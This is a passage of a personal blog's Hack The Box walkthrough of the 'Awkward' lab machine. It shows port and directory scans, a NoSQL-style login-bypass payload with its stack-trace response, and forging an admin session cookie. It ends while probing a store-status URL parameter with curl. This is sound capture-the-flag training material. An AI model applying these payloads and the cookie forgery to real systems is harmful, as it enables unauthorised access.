<!doctype html><html lang=en><head><script async src="https://www.googletagmanager.com/gtag/js?id=G-EQK3ZBE0XH"></script>
<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-EQK3ZBE0XH")</script><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>Awkward HTB Walkthrough - emdwyer</title><meta name=Description content="emdwyer's personal site - development, infosec, security"><meta property="og:title" content="Awkward HTB Walkthrough"><meta property="og:description" content="Introduction A challenging machine offering a VueJS app backed by an Express API. There&rsquo;s also a separate PHP web store app to exploit for privilege escalation and gaining root access on the machine. This was the next medium machine on my list to tick off in my quest to progress to more difficult boxes and gain further experience.
As you&rsquo;ll see, I had some fun with enumerating things, and my notes reflect this."><meta property="og:type" content="article"><meta property="og:url" content="https://emdwyer.github.io/2023-02-25-awkward-htb/"><meta property="og:image" content="https://emdwyer.github.io/logo.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-02-25T00:00:00+11:00"><meta property="article:modified_time" content="2023-02-25T18:56:51+11:00"><meta property="og:site_name" content="emdwyer"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://emdwyer.github.io/logo.png"><meta name=twitter:title content="Awkward HTB Walkthrough"><meta name=twitter:description content="Introduction A challenging machine offering a VueJS app backed by an Express API. There&rsquo;s also a separate PHP web store app to exploit for privilege escalation and gaining root access on the machine. This was the next medium machine on my list to tick off in my quest to progress to more difficult boxes and gain further experience.
As you&rsquo;ll see, I had some fun with enumerating things, and my notes reflect this."><meta name=application-name content="emdwyer"><meta name=apple-mobile-web-app-title content="emdwyer"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://emdwyer.github.io/2023-02-25-awkward-htb/><link rel=prev href=https://emdwyer.github.io/2023-02-11-photobomb/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Awkward HTB Walkthrough","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/emdwyer.github.io\/2023-02-25-awkward-htb\/"},"image":["https:\/\/emdwyer.github.io\/images\/Apple-Devices-Preview.png"],"genre":"posts","keywords":"htb, security, penetration testing, ctf, vue, php, node","wordcount":7128,"url":"https:\/\/emdwyer.github.io\/2023-02-25-awkward-htb\/","datePublished":"2023-02-25T00:00:00+11:00","dateModified":"2023-02-25T18:56:51+11:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":"emdwyer","logo":"https:\/\/emdwyer.github.io\/avatar.jpg"},"author":{"@type":"Person","name":"emdwyer"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"dark"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"dark"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=emdwyer><span class=header-title-pre><i class='far fa-solid fa-terminal' aria-hidden=true></i></span>emdwyer</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>Posts </a><a class=menu-item href=/tags/>Tags </a><a class=menu-item href=/categories/>Categories </a><a class=menu-item href=/about/>About </a><a class=menu-item href=https://github.com/m-dwyer title=GitHub rel="noopener noreffer" target=_blank><i class='fab fa-github fa-fw' aria-hidden=true></i> </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder="Search titles or contents..." id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span>
</span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme"><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=emdwyer><span class=header-title-pre><i class='far fa-solid fa-terminal' aria-hidden=true></i></span>emdwyer</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder="Search titles or contents..." id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>Cancel</a></div><a class=menu-item href=/posts/ title>Posts</a><a class=menu-item href=/tags/ title>Tags</a><a class=menu-item href=/categories/ title>Categories</a><a class=menu-item href=/about/ title>About</a><a class=menu-item href=https://github.com/m-dwyer title=GitHub rel="noopener noreffer" target=_blank><i class='fab fa-github fa-fw' aria-hidden=true></i></a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Awkward HTB Walkthrough</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>emdwyer</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2023-02-25>2023-02-25</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;7128 words&nbsp;
<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;34 minutes&nbsp;<span id=/2023-02-25-awkward-htb/ class=leancloud_visitors data-flag-title="Awkward HTB Walkthrough">
<i class="far fa-eye fa-fw" aria-hidden=true></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;views
</span>&nbsp;</div></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>Contents</span>
<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#foothold>Foothold</a></li><li><a href=#privilege-escalation>Privilege Escalation</a></li><li><a href=#conclusion>Conclusion</a></li></ul></nav></div></div><div class=content id=content><p><img class=lazyload src=/svg/loading.min.svg data-src=./awkward.png data-srcset="./awkward.png, ./awkward.png 1.5x, ./awkward.png 2x" data-sizes=auto alt=./awkward.png title=Awkward></p><h2 id=introduction>Introduction</h2><p>A challenging machine offering a VueJS app backed by an Express API. There&rsquo;s also a separate PHP web store app to exploit for privilege escalation and gaining root access on the machine. This was the next medium machine on my list to tick off in my quest to progress to more difficult boxes and gain further experience.</p><p>As you&rsquo;ll see, I had some fun with enumerating things, and my notes reflect this. What&rsquo;s missing is the little rabbit holes I went down, and I usually leave these out unless they provide further clues / bread crumbs. My write ups are already quite lengthy, and I don&rsquo;t want to bore people.. too much!</p><p>Outside of some fiddly enumeration, this machine involves cookie forgery, server side request forgery, a local file inclusion attack on an API &ndash; which we use for further enumeration, a little forensics on user files to gain a foothold. With a foothold, things become a little clearer and we find a partially developed PHP web store we can view the source for and find a command injection vulnerability triggered when removing items from our cart. This gives us www-data access on the machine, and by running <a href=https://github.com/DominicBreuker/pspy target=_blank rel="noopener noreffer">pspy</a>, we see a recurring cron job running as root we are able to exploit by command injecting into the <code>mail</code> command.</p><h2 id=enumeration>Enumeration</h2><p>As always, let&rsquo;s start with an nmap scan:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$nmap</span> -sC -sV -oA nmap/initial 10.10.11.185
</span></span><span class=line><span class=cl>Starting Nmap 7.92 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-01-30 19:25 AEDT
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.11.185
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.022s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>998</span> closed tcp ports <span class=o>(</span>conn-refused<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu <span class=m>3</span> <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 72:54:af:ba:f6:e2:83:59:41:b7:cd:61:1c:2f:41:8b <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 59:36:5b:ba:3c:78:21:e3:26:b3:7d:23:60:5a:ec:38 <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl>80/tcp open  http    nginx 1.18.0 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Site doesn<span class=err>&#39;</span>t have a title <span class=o>(</span>text/html<span class=o>)</span>.
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: nginx/1.18.0 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 9.19 seconds
</span></span></code></pre></td></tr></table></div></div><p>After adding the hat-valley.htb redirect to <code>/etc/hosts</code> and navigating to <a href=http://hat-valley.htb/ target=_blank rel="noopener noreffer">http://hat-valley.htb/</a> - we are greeted with:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-01-30-19-29-02-image.png data-srcset="./assets/2023-01-30-19-29-02-image.png, ./assets/2023-01-30-19-29-02-image.png 1.5x, ./assets/2023-01-30-19-29-02-image.png 2x" data-sizes=auto alt=./assets/2023-01-30-19-29-02-image.png title=./assets/2023-01-30-19-29-02-image.png></p><p>There is a form further down for submitting your contact details and a message, but this isn&rsquo;t active &ndash; it basically seems like the site is just static content. The favicon and javascript bundle at <code>/js/app.js</code> indicates this is a Vue.js app.</p><p>Let&rsquo;s enumerate paths in gobuster with Parrot&rsquo;s big.txt wordlist:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$gobuster</span> dir -u http://hat-valley.htb -w /usr/share/wordlists/dirb/big.txt 
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>Gobuster v3.1.0
</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:                     http://hat-valley.htb
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Method:                  GET
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:                 <span class=m>10</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:                /usr/share/wordlists/dirb/big.txt
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Negative Status codes:   <span class=m>404</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:              gobuster/3.1.0
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:                 <span class=nv>10s</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2023/01/30 19:31:26 Starting gobuster in directory enumeration <span class=nv>mode</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>/css                  <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 173<span class=o>]</span> <span class=o>[</span>--&gt; /css/<span class=o>]</span>
</span></span><span class=line><span class=cl>/favicon.ico          <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 4286<span class=o>]</span>           
</span></span><span class=line><span class=cl>/js                   <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 171<span class=o>]</span> <span class=o>[</span>--&gt; /js/<span class=o>]</span> 
</span></span><span class=line><span class=cl>/secci�               <span class=o>(</span>Status: 500<span class=o>)</span> <span class=o>[</span>Size: 1704<span class=o>]</span>           
</span></span><span class=line><span class=cl>/static               <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 179<span class=o>]</span> <span class=o>[</span>--&gt; /static/<span class=o>]</span>
</span></span><span class=line><span class=cl>                                                              
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2023/01/30 19:32:31 <span class=nv>Finished</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span></code></pre></td></tr></table></div></div><p>The request above with unprintable character is a bit strange, and gives a 500 error &ndash; which could be something to investigate &ndash; does the web server barf on certain characters?</p><p>In Firefox developer tools when loading the page, I notice SockJs requests to http://localhost:8080/sockjs-node/info?t=1675067935305 which obviously fail.</p><p><code>/js/app.js</code> also references this as the webpack-dev-server:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=cm>/***/</span> <span class=p>(</span><span class=kd>function</span><span class=p>(</span><span class=nx>module</span><span class=p>,</span> <span class=nx>exports</span><span class=p>,</span> <span class=nx>__webpack_require__</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>__webpack_require__</span><span class=p>(</span><span class=cm>/*! /var/www/hat-valley.htb/node_modules/webpack/hot/dev-server.js */</span><span class=s2>&#34;./node_modules/webpack/hot/dev-server.js&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>__webpack_require__</span><span class=p>(</span><span class=cm>/*! /var/www/hat-valley.htb/node_modules/webpack-dev-server/client/index.js?http://localhost:8080&amp;sockPath=/sockjs-node */</span><span class=s2>&#34;./node_modules/webpack-dev-server/client/index.js?http://localhost:8080&amp;sockPath=/sockjs-node&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>module</span><span class=p>.</span><span class=nx>exports</span> <span class=o>=</span> <span class=nx>__webpack_require__</span><span class=p>(</span><span class=cm>/*! ./src/main.js */</span><span class=s2>&#34;./src/main.js&#34;</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>Browsing to <a href=http://hat-valley.htb/sockjs-node target=_blank rel="noopener noreffer">http://hat-valley.htb/sockjs-node</a> shows me I can access the web socket:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-01-30-19-45-54-image.png data-srcset="./assets/2023-01-30-19-45-54-image.png, ./assets/2023-01-30-19-45-54-image.png 1.5x, ./assets/2023-01-30-19-45-54-image.png 2x" data-sizes=auto alt=./assets/2023-01-30-19-45-54-image.png title=./assets/2023-01-30-19-45-54-image.png></p><p>I searched around and played with <code>websocat</code> to see if I could somehow initiate a websocket, but didn&rsquo;t have any luck. What we can gather is that the Vue.js app is likely running on webpack-dev-server, and contains symbols and other useful information showing us the relative paths of files for the application. So, let&rsquo;s assume we&rsquo;re looking at a work in progress web app.</p><p>Browsing through <code>/js/app.js</code> again, I found references to <code>./src/Dashboard.vue</code> and <code>./src/HR.vue</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/***/</span> <span class=s2>&#34;./src/Dashboard.vue&#34;</span><span class=o>:</span>
</span></span><span class=line><span class=cl><span class=cm>/*!***************************!*\
</span></span></span><span class=line><span class=cl><span class=cm>  !*** ./src/Dashboard.vue ***!
</span></span></span><span class=line><span class=cl><span class=cm>  \***************************/</span>
</span></span><span class=line><span class=cl><span class=cm>/*! exports provided: default */</span>
</span></span><span class=line><span class=cl><span class=cm>/***/</span> <span class=p>(</span><span class=kd>function</span><span class=p>(</span><span class=nx>module</span><span class=p>,</span> <span class=nx>__webpack_exports__</span><span class=p>,</span> <span class=nx>__webpack_require__</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/***/</span> <span class=s2>&#34;./src/HR.vue&#34;</span><span class=o>:</span>
</span></span><span class=line><span class=cl><span class=cm>/*!********************!*\
</span></span></span><span class=line><span class=cl><span class=cm>  !*** ./src/HR.vue ***!
</span></span></span><span class=line><span class=cl><span class=cm>  \********************/</span>
</span></span><span class=line><span class=cl><span class=cm>/*! exports provided: default */</span>
</span></span><span class=line><span class=cl><span class=cm>/***/</span> <span class=p>(</span><span class=kd>function</span><span class=p>(</span><span class=nx>module</span><span class=p>,</span> <span class=nx>__webpack_exports__</span><span class=p>,</span> <span class=nx>__webpack_require__</span><span class=p>)</span> <span class=p>{</span>
</span></span></code></pre></td></tr></table></div></div><p>Browsing to <a href=http://hat-valley.htb/dashboard target=_blank rel="noopener noreffer">http://hat-valley.htb/dashboard</a> redirects us to <a href=http://hat-valley.htb/hr target=_blank rel="noopener noreffer">http://hat-valley.htb/hr</a>:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-01-30-20-53-51-image.png data-srcset="./assets/2023-01-30-20-53-51-image.png, ./assets/2023-01-30-20-53-51-image.png 1.5x, ./assets/2023-01-30-20-53-51-image.png 2x" data-sizes=auto alt=./assets/2023-01-30-20-53-51-image.png title=./assets/2023-01-30-20-53-51-image.png></p><h2 id=foothold>Foothold</h2><p>Let&rsquo;s try and log in with admin / foobar, and intercept the request in Burp Suite:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /api/login HTTP/1.1
</span></span><span class=line><span class=cl>Host: hat-valley.htb
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
</span></span><span class=line><span class=cl>Accept: application/json, text/plain, */*
</span></span><span class=line><span class=cl>Accept-Language: en-US,en;q=0.5
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Referer: http://hat-valley.htb/hr
</span></span><span class=line><span class=cl>Content-Type: application/json
</span></span><span class=line><span class=cl>Content-Length: 40
</span></span><span class=line><span class=cl>Origin: http://hat-valley.htb
</span></span><span class=line><span class=cl>DNT: 1
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>Cookie: token=guest
</span></span><span class=line><span class=cl>Pragma: no-cache
</span></span><span class=line><span class=cl>Cache-Control: no-cache
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>{&#34;username&#34;:&#34;admin&#34;,&#34;password&#34;:&#34;foobar&#34;}
</span></span></code></pre></td></tr></table></div></div><p>I attempted a basic login bypass with the following payload substituted into the above:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>
</span></span><span class=line><span class=cl>{
</span></span><span class=line><span class=cl>  &#34;username&#34;: {
</span></span><span class=line><span class=cl>    &#34;$ne&#34;: null
</span></span><span class=line><span class=cl>  },
</span></span><span class=line><span class=cl>  &#34;password&#34;: {
</span></span><span class=line><span class=cl>    &#34;$ne&#34;: null
</span></span><span class=line><span class=cl>   }
</span></span><span class=line><span class=cl>}
</span></span></code></pre></td></tr></table></div></div><p>And received the following response from the web server. Not the response I was hoping for, but nonetheless, stack traces are useful in reconnaissance for seeing what framework, libraries, paths, etc are being used.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>TypeError [ERR_INVALID_ARG_TYPE]: The first argument must be of type string or
</span></span><span class=line><span class=cl>an instance of Buffer, ArrayBuffer, or Array or an Array-like Object.
</span></span><span class=line><span class=cl>Received an instance of Object&lt;br&gt;
</span></span><span class=line><span class=cl>&amp;nbsp; &amp;nbsp;at Function.from (buffer.js:330:9)&lt;br&gt;
</span></span><span class=line><span class=cl>&amp;nbsp; &amp;nbsp;at new Buffer (buffer.js:286:17)&lt;br&gt;
</span></span><span class=line><span class=cl>&amp;nbsp; &amp;nbsp;at module.exports (/var/www/hat-valley.htb/node_modules/sha256/lib/nodecrypto.js:14:12)&lt;br&gt; &amp;nbsp; &amp;nbsp;at /var/www/hat-valley.htb/server/server.js:30:76&lt;br&gt; &amp;nbsp; &amp;nbsp;at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)&lt;br&gt; &amp;nbsp; &amp;nbsp;at next (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:144:13)&lt;br&gt; &amp;nbsp; &amp;nbsp;at Route.dispatch (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:114:3)&lt;br&gt; &amp;nbsp; &amp;nbsp;at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)&lt;br&gt; &amp;nbsp; &amp;nbsp;at /var/www/hat-valley.htb/node_modules/express/lib/router/index.js:284:15&lt;br&gt; &amp;nbsp; &amp;nbsp;at Function.process_params (/var/www/hat-valley.htb/node_modules/express/lib/router/index.js:346:12)
</span></span></code></pre></td></tr></table></div></div><p>I tried a few Node and Mongo bypass techniques, and tried setting the <code>token=admin</code> in the Cookie header of the request.</p><p>When changing this in my browser and refreshing the page (without actually submitting to the login api), I was presented with a dashboard:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-01-30-21-18-04-image.png data-srcset="./assets/2023-01-30-21-18-04-image.png, ./assets/2023-01-30-21-18-04-image.png 1.5x, ./assets/2023-01-30-21-18-04-image.png 2x" data-sizes=auto alt=./assets/2023-01-30-21-18-04-image.png title=./assets/2023-01-30-21-18-04-image.png></p><p>I notice a list of URLs in dev tools, and if I filter on XHR, I see:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-01-30-21-37-26-image.png data-srcset="./assets/2023-01-30-21-37-26-image.png, ./assets/2023-01-30-21-37-26-image.png 1.5x, ./assets/2023-01-30-21-37-26-image.png 2x" data-sizes=auto alt=./assets/2023-01-30-21-37-26-image.png title=./assets/2023-01-30-21-37-26-image.png></p><p>The store status URL is <a href="http://hat-valley.htb/api/store-status?url=%22http:%2F%2Fstore.hat-valley.htb%22" target=_blank rel="noopener noreffer">http://hat-valley.htb/api/store-status?url=%22http:%2F%2Fstore.hat-valley.htb%22</a>, which gives me a 200 okay with no response:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$curl</span> -v <span class=s2>&#34;http://hat-valley.htb/api/store-status?url=%22http:%2F%2Fstore.hat-valley.htb%22&#34;</span>
</span></span><span class=line><span class=cl>*   Trying 10.10.11.185:80...
</span></span><span class=line><span class=cl>* Connected to hat-valley.htb <span class=o>(</span>10.10.11.185<span class=o>)</span> port <span class=m>80</span> <span class=o>(</span><span class=c1>#0)</span>
</span></span><span class=line><span class=cl>&gt; GET /api/store-status?url<span class=o>=</span>%22http:%2F%2Fstore.hat-valley.htb%22 HTTP/1.1
</span></span><span class=line><span class=cl>&gt; Host: hat-valley.htb
</span></span><span class=line><span class=cl>&gt; User-Agent: curl/7.87.0
</span></span><span class=line><span class=cl>&gt; Accept: */*
</span></span><span class=line><span class=cl>&gt; 
</span></span><span class=line><span class=cl>* Mark bundle as not supporting multiuse
</span></span><span class=line><span class=cl>&lt; HTTP/1.1 <span class=m>200</span> OK
</span></span><span class=line><span class=cl>&lt; Server: nginx/1.18.0 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl>&lt; Date: Mon, <span class=m>30</span> Jan <span class=m>2023</span> 10:38:06 GMT
</span></span><span class=line><span class=cl>&lt; Content-Length: <span class=m>0</span>
</span></span><span class=line><span class=cl>&lt; Connection: keep-alive
</span></span><span class=line><span class=cl>&lt; x-powered-by: Express
</span></span><span class=line><span class=cl>&lt; access-control-allow-origin: *
</span></span><span class=line><span class=cl>&lt; 
